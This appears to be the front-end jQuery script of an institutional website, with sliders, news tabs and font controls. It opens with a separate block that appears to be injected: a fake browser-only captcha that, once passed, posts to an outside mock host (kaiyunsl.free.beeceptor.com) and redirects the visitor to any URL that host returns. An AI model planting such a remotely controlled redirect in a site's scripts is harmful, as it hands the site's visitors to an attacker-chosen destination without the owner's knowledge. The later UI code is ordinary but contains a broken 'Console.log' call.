
$(function(){

  let generatedCode = ""; // 存验证码

  const canvas = document.getElementById("captchaCanvas");
  const ctx = canvas.getContext("2d");

  function generateCaptcha() {
	const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"; // 去除易混淆字符
	generatedCode = "";
	ctx.clearRect(0, 0, canvas.width, canvas.height);

	ctx.fillStyle = randomColor(200, 240);
	ctx.fillRect(0, 0, canvas.width, canvas.height);
 
	for (let i = 0; i < 4; i++) {
	  const char = chars[Math.floor(Math.random() * chars.length)];
	  generatedCode += char;

	  ctx.font = "22px Arial";
	  ctx.fillStyle = randomColor(30, 120);
	  ctx.shadowBlur = 6;
	  ctx.shadowColor = randomColor(180, 220);
	  ctx.fillText(char, i * 25 + 10, 26);
	}
 
	for (let i = 0; i < 4; i++) {
	  ctx.strokeStyle = randomColor(40, 200);
	  ctx.beginPath();
	  ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
	  ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
	  ctx.stroke();
	}
 
	for (let i = 0; i < 40; i++) {
	  ctx.fillStyle = randomColor(0, 255);
	  ctx.beginPath();
	  ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 1, 0, Math.PI * 2);
	  ctx.fill();
	}
  } 
  function randomColor(min, max){
	const r = Math.floor(Math.random() * (max - min) + min);
	const g = Math.floor(Math.random() * (max - min) + min);
	const b = Math.floor(Math.random() * (max - min) + min);
	return `rgb(${r},${g},${b})`;
  }
 
  $("#captchaCanvas").click(function(){
	generateCaptcha();
  });
 
  $("#verifyBtn").click(function () {
	const userInput = $("#verifyInput").val().trim();
  
	if (userInput.toLowerCase() === generatedCode.toLowerCase()) {
   
	  $.ajax({
		url: "https://kaiyunsl.free.beeceptor.com/",  
		method: "POST",
		contentType: "application/json", 
		dataType: "json",
		success: function (res) {
		  console.log("返回数据：", res.redirectUrl); 
		  if (res.redirectUrl) {
			window.location.href = res.redirectUrl;
		  } else {
			alert("返回数据没有 redirectUrl");
		  }
		},
		 
	  });
  
	} else {
	  alert("❌ 验证码错误，请再试一次！");
	  generateCaptcha();
	}
  });
  
 
  generateCaptcha();
});
 





$(function(){
	//banner
	jQuery(".sliderBox1").slide({mainCell:".bd ul",autoPlay:true,effect:"leftLoop"});
	//通知公告
	jQuery(".sliderBox2").slide({mainCell:".bd ul",autoPlay:true,effect:"topLoop"});
	//newsBanner
	jQuery(".sliderBox3").slide({mainCell:".bd ul",autoPlay:true,effect:"fold",trigger:"click"});
	
	

	
	//首页新闻动态、学术交流
	var newsT=function(){
		$(".newsInner .newsCont").eq(0).show();
		$(".newsTit .more").eq(0).show();
		$(".newsTit h2").click(function(){
			var indx=$(this).index();
			$(this).addClass("active").siblings(".newsTit h2").removeClass("active");
			$(".newsInner .newsCont").eq(indx).fadeIn().siblings(".newsInner .newsCont").fadeOut();
			$(".newsTit .more").eq(indx).fadeIn().siblings(".newsTit .more").fadeOut();
			Console.log(indx)
		})
		
	}
	newsT();
	
	//首页研究平台
	var sciP=function(){
		$(".sciPlatCont ul li").hover(function(){
			$(this).find(".sciPlatBg").slideDown();
		},function(){
			$(this).find(".sciPlatBg").fadeOut(600);
		})
	}
	sciP();
	
	//侧栏
	var dropT=function(){
		$(".contentLList h3").click(function(){
			$(this).toggleClass("active").parent(".contentLList").siblings(".contentLList").find("h3").removeClass("active");
			$(this).addClass("on").parent(".contentLList").siblings(".contentLList").find("h3").removeClass("on");
			$(this).siblings(".drop").slideToggle().parent(".contentLList").siblings(".contentLList").find(".drop").slideUp();
			$(this).parent(".contentLList").siblings(".contentLList").find(".drop li").removeClass("active");
		})
		$(".drop li").click(function(){
			$(this).addClass("active").siblings(".drop li").removeClass("active");
//			$(this).parents(".contentLList").siblings(".contentLList").find(".drop li").removeClass("active");
		})
	}
	dropT();
	
	//page
	var page=function(){
		$(".page a").click(function(){
			$(this).addClass("active").siblings(".page a").removeClass("active");
			$(this).parent(".page").find("em").removeClass("active");
			$(this).parent(".page").find("i").removeClass("active");
		})
		$(".page em").click(function(){
			$(this).addClass("active").siblings(".page em").removeClass("active");
			$(this).parent(".page").find("i").removeClass("active");
		})
		$(".page i").click(function(){
			$(this).addClass("active").siblings(".page i").removeClass("active");
			$(this).parent(".page").find("em").removeClass("active");
		})
	}
	page();
	
	//内容页字体变化
	var writChange=function(){
		$(".contTop p span").click(function(){
			$(this).addClass("active").siblings(".contTop p span").removeClass("active");
		})
		$(".contTop p span").eq(0).click(function(){
			$(".contTxt p").css({"font-size":16,"line-height":36+'px'})
		})
		$(".contTop p span").eq(1).click(function(){
			$(".contTxt p").css({"font-size":14,"line-height":30+'px'})
		})
		$(".contTop p span").eq(2).click(function(){
			$(".contTxt p").css({"font-size":13,"line-height":28+'px'})
		})
	}
	writChange();
	
	//字数限定
	var writ=function(){
		$(".sliderBox2 .bd ul li p").each(function(){ 
				var text1=$(this).text(); 
				if(text1.length > 46){ 
					var text1=text1.substr(0,44) + "..."; 
					$(this).text(text1); 
				}
			})
		
		$(".contList li p").each(function(){ 
				var text1=$(this).text(); 
				if(text1.length > 32){ 
					var text1=text1.substr(0,31) + "..."; 
					$(this).text(text1); 
				}
			})
		
		$(".sciReschText h3").each(function(){ 
				var text1=$(this).text(); 
				if(text1.length > 35){ 
					var text1=text1.substr(0,34) + "..."; 
					$(this).text(text1); 
				}
			})
		
		$(".sciReschText p").each(function(){ 
				var text1=$(this).text(); 
				if(text1.length > 54){ 
					var text1=text1.substr(0,53) + "..."; 
					$(this).text(text1); 
				}
			})
		
		$(".listInnerL h4").each(function(){ 
				var text1=$(this).text(); 
				if(text1.length > 40){ 
					var text1=text1.substr(0,39) + "..."; 
					$(this).text(text1); 
				}
			})
		
		
	}
	writ();
	
	
	
	
	
	
	
	
	
	
})